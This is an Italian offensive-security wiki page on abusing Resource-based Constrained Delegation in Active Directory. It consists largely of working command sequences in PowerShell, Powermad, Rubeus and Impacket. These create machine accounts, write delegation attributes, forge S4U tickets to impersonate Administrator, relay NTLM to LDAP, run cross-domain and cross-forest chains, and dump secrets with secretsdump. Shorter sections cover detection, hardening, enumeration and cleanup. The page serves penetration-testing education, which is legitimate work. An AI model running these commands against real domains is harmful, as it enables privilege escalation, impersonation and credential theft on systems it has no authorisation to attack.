# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

È simile alla [Constrained Delegation](constrained-delegation.md) di base, ma **invece** di assegnare permessi a un **object** per **impersonate qualsiasi user verso una machine**, la Resource-based Constrain Delegation **imposta** nell'**object** chi è in grado di impersonare qualsiasi user verso di esso.<sup>[[12]](#references)</sup>

In questo caso, l'object vincolato avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'user che può impersonare qualsiasi altro user nei suoi confronti.

Un'altra differenza importante tra questa Constrained Delegation e le altre delegations è che qualsiasi user con **write permissions su un machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (nelle altre forme di Delegation erano necessari privilegi di domain admin).<sup>[[1]](#references)</sup>

### New Concepts

In Constrained Delegation era stato detto che il flag **`TrustedToAuthForDelegation`** all'interno del valore _userAccountControl_ dell'user è necessario per eseguire un **S4U2Self.** Ma non è completamente vero.\
La realtà è che, anche senza quel valore, puoi eseguire un **S4U2Self** verso qualsiasi user se sei un **service** (hai uno SPN), ma, se **hai `TrustedToAuthForDelegation`**, il TGS restituito sarà **Forwardable**, mentre se **non hai** quel flag, il TGS restituito **non sarà** **Forwardable**.

Tuttavia, se il **TGS** usato in **S4U2Proxy** **NON è Forwardable**, il tentativo di abusare di una **basic Constrain Delegation** **non funzionerà**. Ma se stai cercando di sfruttare una Resource-Based constrain delegation, funzionerà.<sup>[[1]](#references)[[2]](#references)</sup>

### Attack structure

> Se hai **write equivalent privileges** sull'account di un **Computer**, puoi ottenere **privileged access** su quella machine.

Supponiamo che l'attacker disponga già di **write equivalent privileges sul computer della vittima**.

1. L'attacker **compromette** un account che ha uno **SPN** o ne **crea uno** (“Service A”). Nota che qualsiasi _Admin User_ senza altri privilegi speciali può **creare** fino a 10 Computer objects (**_MachineAccountQuota_**) e assegnare loro uno **SPN**. Quindi l'attacker può semplicemente creare un Computer object e assegnargli uno SPN.
2. L'attacker **abusa del proprio privilegio WRITE** sul computer della vittima (ServiceB) per configurare la resource-based constrained delegation in modo da consentire a ServiceA di impersonare qualsiasi user verso quel computer della vittima (ServiceB).
3. L'attacker usa Rubeus per eseguire un **full S4U attack** (S4U2Self e S4U2Proxy) da Service A a Service B per un user **con privileged access a Service B**.
1. S4U2Self (dall'account con SPN compromesso/creato): richiede un **TGS di Administrator verso di me** (Not Forwardable).
2. S4U2Proxy: usa il **not Forwardable TGS** del passaggio precedente per richiedere un **TGS** da **Administrator** verso il **victim host**.
3. Anche se stai usando un TGS non Forwardable, poiché stai sfruttando la Resource-based constrained delegation, funzionerà.
4. L'attacker può eseguire **pass-the-ticket** e **impersonate** l'user per ottenere **accesso al victim ServiceB**.<sup>[[1]](#references)</sup>

Per verificare la _**MachineAccountQuota**_ del domain puoi usare:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attacco

### Creazione di un oggetto computer

Puoi creare un oggetto computer all'interno del dominio utilizzando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurazione della Resource-based Constrained Delegation

**Utilizzo del modulo PowerShell ActiveDirectory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilizzo di powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Performing a complete S4U attack (Windows/Rubeus)

Per prima cosa, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi ci serve l'hash di quella password:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Questo stamperà gli hash RC4 e AES per quell'account.\
Ora, l'attacco può essere eseguito:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puoi generare più ticket per più servizi semplicemente effettuando una sola richiesta tramite il parametro `/altservice` di Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Nota che gli utenti hanno un attributo chiamato "**Cannot be delegated**". Se questo attributo è impostato su True per un utente, non potrai impersonarlo. Questa proprietà può essere visualizzata all'interno di BloodHound.

### Tooling Linux: RBCD end-to-end con Impacket (2024+)

Se operi da Linux, puoi eseguire l'intera catena RBCD utilizzando gli strumenti ufficiali di Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Note
- Se la firma LDAP/LDAPS è applicata, usa `impacket-rbcd -use-ldaps ...`.
- Preferisci le chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi flussi solo-AES.
- Impacket può riscrivere `sname` ("AnySPN") per alcuni tool, ma ottieni lo SPN corretto quando possibile (ad es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD tra domini e tra foreste

Se il **principal delegante** che controlli risiede in un **dominio diverso** (o persino in una **foresta diversa**) rispetto al **computer risorsa**, l'abuso è comunque **RBCD**, ma il flusso dei ticket non è più il consueto `S4U2Self -> S4U2Proxy` a dominio singolo.

### RBCD tra domini: configura il principal esterno tramite SID

Quando imposti `msDS-AllowedToActOnBehalfOfOtherIdentity` da un **dominio diverso**, il computer/utente esterno potrebbe **non essere risolvibile per nome** nell'LDAP del dominio target. In tal caso, configura la voce di delega usando il **SID** del principal esterno invece del suo sAMAccountName/UPN.

Questo è particolarmente rilevante quando esegui il relaying di NTLM verso LDAP con `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Note:
- `--sid` indica a `ntlmrelayx.py` di trattare `--escalate-user` come un SID, requisito necessario quando l'account delegante è esterno al dominio di destinazione.
- Anche se il tool stampa `User not found in LDAP`, la scrittura della delega può comunque avere esito positivo, perché il security descriptor memorizza direttamente il SID esterno.

### RBCD tra domini: sequenza S4U cross-realm

Una volta che il principal esterno è presente in `msDS-AllowedToActOnBehalfOfOtherIdentity`, il flusso cross-domain funzionante è:<sup>[[9]](#references)[[13]](#references)</sup>

1. Ottenere un **TGT** per il principal delegante dal proprio dominio.
2. Richiedere un **referral TGT** per `krbtgt/<target-domain>`.
3. Richiedere un **cross-realm S4U2Self referral** per l'utente impersonato sul DC del target-domain.
4. Richiedere il ticket **S4U2Self** effettivo per quell'utente nel dominio del delegante.
5. Eseguire **S4U2Proxy** nel dominio del delegante per ottenere un referral ticket per il target domain.
6. Eseguire il **S4U2Proxy** finale sul DC del target-domain per ottenere il service ticket per `cifs/host.target`, `host/host.target`, ecc.

Questo spiega perché i tool Linux standard spesso falliscono con RBCD cross-domain:<sup>[[9]](#references)</sup>
- il **realm** della richiesta potrebbe dover essere diverso dal realm del TGT utilizzato nel `TGS-REQ`
- la catena richiede **passaggi S4U2Proxy indipendenti**, non solo `S4U2Self` oppure `S4U2Self` seguito immediatamente da un singolo `S4U2Proxy`

### RBCD cross-domain da Linux

Synacktiv ha pubblicato un'implementazione di `getST.py` per Impacket che riproduce la sequenza cross-realm da Linux gestendo esplicitamente i due KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Dal punto di vista operativo, i nuovi argomenti sono:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del computer **risorsa**
- `-targetdc`: DC del dominio **risorsa**

### Limitazioni di RBCD tra foreste

RBCD tra foreste presenta un'importante limitazione: **l'utente impersonato deve appartenere alla stessa foresta del principal delegante**. In altre parole, se il tuo account macchina controllato si trova in `valhalla.local` e la risorsa target si trova in `asgard.local`, in genere **non puoi impersonare utenti arbitrari di `asgard.local`** verso quella risorsa tramite RBCD.<sup>[[9]](#references)</sup>

È comunque sfruttabile quando:
- l'utente della **foresta delegante** è un **amministratore locale** (o dispone altrimenti di privilegi) sull'host della risorsa nell'altra foresta
- un trust consente il percorso di autenticazione richiesto e il SID esterno è accettato nel security descriptor del computer target

### Peculiarità del protocollo RBCD tra foreste

RBCD tra foreste non è semplicemente "tra domini con un trust". Il flusso osservato include due peculiarità che i tool comuni storicamente non gestiscono:<sup>[[9]](#references)</sup>

1. Una richiesta **S4U2Proxy** aggiuntiva che imposta `PA-PAC-OPTIONS=branch-aware`
2. Un service ticket finale che può essere restituito usando **RC4** anche quando sono stati richiesti altri etype

Il flusso pratico è:

1. Ottieni un TGT per il principal delegante nella foresta A.
2. Richiedi **S4U2Self** per l'utente impersonato nella foresta A.
3. Richiedi **S4U2Proxy** nella foresta A per ottenere un referral TGT per la foresta B.
4. Invia una seconda richiesta **S4U2Proxy** nella foresta A **senza il ticket S4U2Self come additional ticket**, ma con `branch-aware` abilitato, per ottenere un altro referral TGT per la foresta B.
5. Facoltativamente, richiedi un service ticket normale nella foresta B per il principal delegante (questo ticket non è necessario per l'abuso finale).
6. Usa i referral ticket dei passaggi 3 e 4 per richiedere il ticket **S4U2Proxy** finale nella foresta B, per l'utente della foresta A impersonato, verso lo SPN target.

### RBCD tra foreste da Linux

Lo stesso branch di Synacktiv di Impacket aggiunge uno switch `-forest` per questa logica:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD ricorsivo multi-dominio (3+ domini)

Nelle **foreste multi-dominio**, sia **S4U2Self** che **S4U2Proxy** possono essere **ricorsivi** invece di fermarsi dopo un solo referral:

- **S4U2Self ricorsivo**: il primo `S4U2Self` viene inviato al **dominio dell'utente impersonato**, gli hop intermedi tra domini parent/child vengono attraversati con normali referral `TGS-REQ` per `krbtgt/<REALM>`, e l'**`S4U2Self` finale** viene inviato nel **dominio del delegating principal**.
- Ciò significa che può essere sufficiente **possedere un TGT** per un machine account per impersonare un **amministratore di un altro dominio della stessa foresta** e richiedere `cifs/host`, `host/host`, `wsman/host`, ecc.
- **S4U2Proxy ricorsivo** segue la trust chain nello stesso modo: gli hop intermedi riutilizzano il ticket precedente come TGT durante la richiesta del referral `krbtgt/<REALM>` successivo, e solo l'ultimo hop restituisce il service ticket finale.<sup>[[10]](#references)</sup>

Un esempio pratico nella stessa foresta è:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Se il **principal delegante è un utente senza SPN**, l'ultimo `S4U2Self` ricorsivo fallisce con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La soluzione consiste nel **riprovare solo l'ultimo hop come `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versione breve della catena di abuso:

1. Autenticarsi con l'**NT hash** in modo da spingere il KDC verso **RC4-HMAC (etype 23)**.
2. Richiedere prima **`-self -u2u`** e mantenere quel ticket separato dal successivo passaggio proxy.
3. Estrarre la **chiave di sessione del TGT** con `describeTicket.py`.
4. Sostituire l'**NT hash** dell'utente con quella **chiave di sessione** usando `changepasswd.py -newhashes <session_key>`.
5. Riutilizzare il ticket **`S4U2Self+U2U`** come **`-additional-ticket`** durante una richiesta **`-proxy`** separata.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Note operative:

- Quando il **primo trusted hop è già un'altra forest**, preferire l'algoritmo **branch-aware** (`getST.py ... -forest`) per replicare il comportamento nativo di Windows. Se la forest esterna viene raggiunta solo **più avanti** nella catena, il flusso ricorsivo non branch-aware potrebbe comunque funzionare.<sup>[[9]](#references)</sup>
- Sui DC **Windows Server 2022/2025** recenti, forzare RC4 può fallire con **`KDC_ERR_ETYPE_NOSUPP`** a causa della deprecazione di RC4; questo può rendere **SPN-less RBCD impossibile**, anche se la RBCD classica basata su SPN continua a funzionare con AES.<sup>[[15]](#references)</sup>
- Eseguire **`S4U2Self+U2U` prima di modificare l'hash/la password dell'utente**: `SamrChangePasswordUser` **non** ricalcola le chiavi AES Kerberos dell'account, quindi modificare prima la password può interrompere le successive richieste di ticket.<sup>[[14]](#references)</sup>
- L'account impersonato deve essere ancora **delegable**: **Protected Users** e gli account con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloccano la catena.

## Note su detection / hardening

- I percorsi RBCD tra domini/forest vengono ancora generalmente creati tramite **ACL abuse** o **relay-to-LDAP**. Applicare **LDAP signing** e **LDAP channel binding** sui DC per interrompere i comuni percorsi di setup.
- Verificare chi può scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` sugli oggetti computer e risolvere i SID memorizzati, inclusi i **foreign security principals**.
- Negli ambienti con molti trust, esaminare **Selective Authentication**, **SID filtering** e verificare se gli utenti di una forest esterna dispongono di privilegi di **local admin** sugli host che ospitano le risorse.

### Accesso

L'ultima command line eseguirà l'**attacco S4U completo e inietterà il TGS** da Administrator all'host vittima **in memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** da Administrator, quindi sarà possibile accedere a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusare di diversi service ticket

Scopri i [**service ticket disponibili qui**](silver-ticket.md#available-services).

## Enumerazione, auditing e cleanup

### Enumerare i computer con RBCD configurato

PowerShell (decodifica dell’SD per risolvere i SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leggere o svuotare con un comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Pulizia / ripristino di RBCD

- PowerShell (cancella l'attributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errori Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: significa che kerberos è configurato per non usare DES o RC4 e si sta fornendo solo l'hash RC4. Fornire a Rubeus almeno l'hash AES256 (oppure fornire semplicemente gli hash rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` per un utente normale: il principal delegante probabilmente **non ha alcun SPN**. Riprovare l'**ultimo hop** come **`S4U2Self+U2U`** invece di un normale **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante **RBCD senza SPN**: i DC recenti possono rifiutare il percorso **RC4-HMAC** forzato richiesto dal trucco **`S4U2Self+U2U` + sostituzione della session key**. Provare invece un percorso RBCD classico **supportato da SPN** con AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: significa che l'ora del computer corrente è diversa da quella del DC e kerberos non funziona correttamente.
- **`preauth_failed`**: significa che la combinazione di username + hash fornita non funziona per il login. Potreste aver dimenticato di inserire il carattere "$" nello username durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: può significare:
- L'utente che si sta cercando di impersonare non può accedere al servizio desiderato (perché non è possibile impersonarlo o perché non dispone di privilegi sufficienti)
- Il servizio richiesto non esiste (se si richiede un ticket per winrm ma winrm non è in esecuzione)
- Il fakecomputer creato ha perso i propri privilegi sul server vulnerabile ed è necessario riassegnarglieli.
- Si sta eseguendo un abuso di KCD classico; ricordare che RBCD funziona con ticket S4U2Self non-forwardable, mentre KCD richiede ticket forwardable.

## Note, relay e alternative

- È anche possibile scrivere l'RBCD SD tramite Active Directory Web Services (ADWS) se LDAP è filtrato. Vedere:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Le catene di relay Kerberos terminano spesso in RBCD per ottenere SYSTEM locale in un solo passaggio. Vedere esempi pratici end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se LDAP signing/channel binding sono **disabilitati** ed è possibile creare un machine account, strumenti come **KrbRelayUp** possono eseguire il relay di un'autenticazione Kerberos forzata verso LDAP, impostare `msDS-AllowedToActOnBehalfOfOtherIdentity` per il proprio machine account sull'oggetto computer target e impersonare immediatamente **Administrator** tramite S4U da off-host.<sup>[[8]](#references)</sup>

## Riferimenti

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
